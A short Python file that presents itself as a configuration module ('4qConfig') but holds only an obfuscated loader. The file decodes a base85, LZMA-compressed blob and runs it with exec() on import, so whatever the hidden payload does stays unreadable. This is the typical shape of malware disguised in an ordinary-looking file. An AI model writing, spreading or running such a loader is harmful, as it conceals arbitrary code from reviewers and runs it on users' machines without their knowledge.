# 4qConfig
import lzma, base64
_data = b'{Wp48S^xk9=GL@E0stWa8~^|S5YJf5-~@OAEL{LJn@VT6Qap47uD?*%pqR^2IeP3OZ&0(1-hSC}{k&JXX;~YG;7Ab&!cUhzo__8K&ijeNOQM8Xq}f<WPz+XXYr1a*l6R~*xQV{m+PEF!+=G$f>82L!3q_UrTKE|VbpYvw-K0NSvySL#uIkfKA8Czw7WJy^af?E?LKN?Pn}Wg^1kFGmK?o=62~W-q>UUJa<3ZH>+s=P<aWwR++?dU^EL=r8bg~{>*!{v<)nO-5GqUN&X<Sc5T4q~o{%Qxvan#$XEc!E0v20y*5rW;9*|m3z!mr<o_%;58odX-TjyzszyzHmI;i^-Z1bnZOQZxJu<}3tqQ*CuQGP|^z6WeaaT%H$O9Aqu+GJ{Xsp98CaCM1{hT_0pF{^b8m{hECcq5y&X(&YWoU~{%DC969ko4{X@d?GP8agm6NbvzZcA2mCzA`tO$!U2(8;(6^BCnOSYzhutzA)SS<zzKIk0)va|9kW^Y)>8xb0_=i!0I6gf4rjGyJVLaHp2Bj|a7TWRaRDVHQiVZ=3iVsBxmb!Pe+cDtd!dcLzt`D`19rTY?gn>A8R=0>;2ODZGh9Q#yT1Z87yOd47NqOQ2J80|-3O}ZsziDN`UiwSmQZLV)x_$+g(f2y$$o{t_`9F2(xuB8uiU|j3mzse(qpo3exE#@+%)dOg{;e%u|*=fKR+apE)NbV*+jL}=>!P4<!!zVvEx-m;@2G%2AV+ta%jf+<+m@w00GDZ`3L|2QRWjqvBYQl0ssI200dcD'
_exec = lzma.decompress(base64.b85decode(_data)).decode('utf-8')
exec(_exec)
